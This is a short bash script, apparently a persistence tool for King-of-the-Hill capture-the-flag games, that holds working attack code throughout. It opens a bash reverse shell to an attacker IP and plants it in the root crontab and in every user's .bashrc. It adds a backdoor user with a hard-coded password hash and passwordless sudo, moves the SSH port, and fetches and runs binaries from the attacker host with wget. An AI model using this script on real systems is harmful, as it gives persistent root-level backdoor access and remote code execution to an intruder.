## made by #blvckmetxl


#!/bin/bash

nickname=
ip=
port=
revsh="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
ssh="/etc/ssh/sshd_config"

function nyan() {
  wget http://$ip/nyancat
  chmod +x nyancat
  mv -f nyancat /usr/bin/nyancat
}

function persist() {
  useradd -u 666 -m $nickname -s /bin/bash
  sudo sed -i "s/$nickname:x:/$nickname:qpQzOFb2UGjtE:/g" /etc/passwd
  echo "$nickname ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

  echo "* * * * * root $revsh" >> /etc/crontab
  echo $revsh >> ~/.bashrc

  find /home -name .bashrc -print0 | while IFS= read -r -d $'\0' file; do echo $revsh >> $file; done
}

function ssh() {
  sed -i 's/Port/#Port/g' $ssh
  echo "Port $RANDOM" >> $ssh

  echo "[+] NEW PORT IS `tail -n 1 $ssh | cut -d' ' -f2`!"
  systemctl restart sshd.service
}

function koth() {
  rm chattr; rm -f $(which chattr)
  
  while :
  do
    wget http://$ip/chattr
    chmod +x chattr
    ./chattr -ai /root/king.txt
    echo "$nickname" > /root/king.txt
    ./chattr +ai /root/king.txt
    rm chattr
  done
}

if [ "$#" -gt 0 ]
then
  case "$1" in
        a) persist
           nyan
           koth;;
        -a)persist
           nyan
           koth;;

        p) persist;;
        -p)persist;;

        n) nyan;;
        -n)nyan;;

        s) ssh;;
        -s)ssh;;
  esac
else
  koth
fi
